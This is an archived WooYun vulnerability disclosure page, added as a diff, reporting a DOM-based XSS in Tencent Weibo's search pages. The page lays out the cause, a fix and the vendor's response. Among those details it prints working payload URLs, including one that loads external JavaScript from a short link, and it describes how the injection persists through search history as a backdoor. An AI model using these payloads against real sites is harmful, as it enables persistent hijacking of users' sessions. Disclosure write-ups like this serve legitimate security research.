@@ -1,0 +1,262 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯微博一处两用DOM-XSS，能反射，能后门  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯微博一处两用DOM-XSS，能反射，能后门  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-12-02 23:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-12-24：	细节向普通白帽子公开<br/>
+									2013-01-03：	细节向实习白帽子公开<br/>
+									2013-01-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">看了应该是某黑客发了一条微博：内容里含有 &quot;每月来一次&quot; 的字眼。出于好奇，我就点了进去。然后打开了正在开发中的XSS扫描器，于是就有了此文。。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.就是看到了这条微博，对于这个&quot;关键词&quot; 订阅的功能，出于好奇，我就点了进去。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/02222357447e7d580be375304b65b4a06a893671.jpg" target="_blank"><img src="../images/02222357447e7d580be375304b65b4a06a893671.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 然后打开了开发中的扫描器，对这个页面中的二级链接进行了全部扫描。发现以下结果。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/022225001dc0c8d47ca466bb97194d7b6d50c8f1.jpg" target="_blank"><img src="../images/022225001dc0c8d47ca466bb97194d7b6d50c8f1.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 从上图，我们可以看到至少2点信息：<br />
+<br />
+  1） \x22 变成了 双引号，而这种变化，只有DOM类XSS才会出现。<br />
+<br />
+  2） 输出在 title=&quot;之间&quot;  和  &lt;xx&gt;之间&lt;/xx&gt;  都存在。<br />
+<br />
+<br />
+<br />
+4. 我们选取 title 之间的输出，进行猜测性的构造利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://search.t.qq.com/qun.php?pos=411&amp;k=\x22\x3E\x3cimg\x2fsrc\x3d1\x20onerror\x3d\x22alert(1)\x22</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+放入浏览器，可以看到效果：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/022229483a0db25905369e73daef492016daab6c.jpg" target="_blank"><img src="../images/022229483a0db25905369e73daef492016daab6c.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 我们进一步可以构造调用外部JS的代码，值得注意的是 k 参数有64个字符的长度限制。而此处是dom-xss，通过innerHTML输出的，无法使用 &lt;script src=&quot;xx&quot;&gt;&lt;/script&gt;这种vector的。这里以在chrome下的测试为例。我们使用比较短的&lt;svg onload=&quot;脚本&quot;&gt; 的方式来调用外部JS。其中短连接为我们的外部JS文件。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://search.t.qq.com/qun.php?pos=411&amp;k=\x22\x3E\x3csvg/onload\x3dUI.getScript(\x22//url.cn/7Hdsis\x22) 1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6. 这样一来，一个DOM xss就OK了。<br />
+<br />
+<br />
+<br />
+7. 但是并不是这样， 出现问题的地方在，搜索历史模块，而这个模块会记录用户的搜索历史，并且出现在search.t.qq.com的首页及各处子页面。也就是，当受害者访问了我们指定的页面后，除了遭遇一次反射型XSS攻击外，在之后的日子里，search.t.qq.com下的页面都被我们植入了后门。<br />
+<br />
+<br />
+<br />
+8. 从xsser.me的记录信息来看， 后门确实触发了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/02224617655ecd81649777c9bea7f3ff82e10584.jpg" target="_blank"><img src="../images/02224617655ecd81649777c9bea7f3ff82e10584.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9. 至于怎么利用我就不多说了。 回头来看看这个漏洞的成因。抓下包，可以看到搜索历史会通过ajax的方式来加载。而返回的数据是一段JS，在JS的字符串 list中，又没有对\进行过滤。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/022248152d70e7aa5c0a948f27b68ef67df06959.jpg" target="_blank"><img src="../images/022248152d70e7aa5c0a948f27b68ef67df06959.jpg" alt="8.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 在从http://search.t.qq.com/asyn/getSearchHistory.php获取返回数据之后，会调用 UI.evalScript(data.info); <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/022255461500a4f98e50cd1b2b655896ec812de7.jpg" target="_blank"><img src="../images/022255461500a4f98e50cd1b2b655896ec812de7.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+UI.evalScript的代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>function (b){var c=this.regExp.script;(b=(b||&quot;&quot;).match(RegExp(c,&quot;img&quot;)))&amp;&amp;UI.each(b,function(b){eval(b.match(RegExp(c,&quot;im&quot;))[1])})}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+它会取出data.info中, &lt;script&gt; ...&lt;/script&gt; 之间的部分，然后 eval<br />
+<br />
+<br />
+<br />
+被eval的JS里，则会将list字符串的内容append到HTML中。<br />
+<br />
+<br />
+<br />
+</p><pre><code>...<br />
+UI.append(UI.html(list)[0], $(&#039;searchHistory&#039;));<br />
+...</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详情 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">将 http://search.t.qq.com/asyn/getSearchHistory.php 返回数据中，该过滤 \ 的位置给过滤掉。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015530" title="腾讯微博一处两用DOM-XSS，能反射，能后门">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-12-04 14:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15530";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
